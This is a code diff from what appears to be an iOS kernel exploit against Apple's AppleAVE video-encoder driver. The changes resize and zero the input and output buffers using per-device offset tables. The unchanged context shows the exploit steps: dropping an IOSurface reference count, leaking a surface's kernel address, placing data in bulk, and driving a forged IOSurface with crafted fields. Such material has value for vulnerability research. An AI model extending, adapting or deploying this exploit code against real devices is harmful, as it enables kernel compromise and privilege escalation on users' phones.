@@ -32,9 +32,12 @@ kern_return_t apple_ave_pwn_drop_surface_refcount(void * surface_kernel_address)
 	
 	kern_return_t ret = KERN_SUCCESS;
 	io_connect_t apple_ave_conn_for_drop_refcount = 0;
-	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
-	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};
-	
+    char input_buffer[OFFSET(encode_frame_input_buffer_size)];
+    char output_buffer[OFFSET(encode_frame_output_buffer_size)];
+    
+    bzero(input_buffer, sizeof(input_buffer));
+    bzero(output_buffer, sizeof(output_buffer));
+
 	ret = apple_ave_utils_get_connection(&apple_ave_conn_for_drop_refcount);
 	if (KERN_SUCCESS != ret)
 	{
@@ -104,10 +107,13 @@ cleanup:
 kern_return_t apple_ave_pwn_get_surface_kernel_address(uint32_t surface_id, void ** surface_kernel_address) {
 	
 	kern_return_t ret = KERN_SUCCESS;
-	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
-	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};
 
+    char input_buffer[OFFSET(encode_frame_input_buffer_size)];
+    char output_buffer[OFFSET(encode_frame_output_buffer_size)];
     
+    bzero(input_buffer, sizeof(input_buffer));
+    bzero(output_buffer, sizeof(output_buffer));
+
 	//*(unsigned int*)input_buffer = 0xDEADBEEF;
 	*(unsigned int*)(input_buffer + 0x4) = g_bad_surface_that_will_never_be_freed;
 	*(unsigned int*)(input_buffer + 0x8) = g_bad_surface_that_will_never_be_freed;
@@ -157,12 +163,11 @@ cleanup:
 kern_return_t apple_ave_pwn_put_data_in_bulk(void * address_with_data) {
 	
 	kern_return_t ret = KERN_SUCCESS;
-	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
-	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};
-
-	bzero(input_buffer, ENCODE_FRAME_INPUT_BUFFER_SIZE);
-	bzero(output_buffer, ENCODE_FRAME_OUTPUT_BUFFER_SIZE);
-
+    char input_buffer[OFFSET(encode_frame_input_buffer_size)];
+    char output_buffer[OFFSET(encode_frame_output_buffer_size)];
+    
+    bzero(input_buffer, sizeof(input_buffer));
+    bzero(output_buffer, sizeof(output_buffer));
 
 	//*(unsigned int*)input_buffer = 0xDEADBEEF;
 	*(unsigned int*)(input_buffer) = g_bad_surface_that_will_never_be_freed;
@@ -337,8 +342,11 @@ kern_return_t apple_ave_pwn_use_fake_iosurface(void * fake_iosurface_address) {
 	
 	kern_return_t ret = KERN_SUCCESS;
 	io_connect_t apple_ave_rop_conn = 0;
-	char input_buffer[ENCODE_FRAME_INPUT_BUFFER_SIZE] = {0};
-	char output_buffer[ENCODE_FRAME_OUTPUT_BUFFER_SIZE] = {0};
+    char input_buffer[OFFSET(encode_frame_input_buffer_size)];
+    char output_buffer[OFFSET(encode_frame_output_buffer_size)];
+    
+    bzero(input_buffer, sizeof(input_buffer));
+    bzero(output_buffer, sizeof(output_buffer));
 
 	*((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_chroma_format_idc)) = 1;
 	*(unsigned int*)((char*)g_bad_surface_buffer + OFFSET(encode_frame_offset_ui32_width)) = 0xC0;
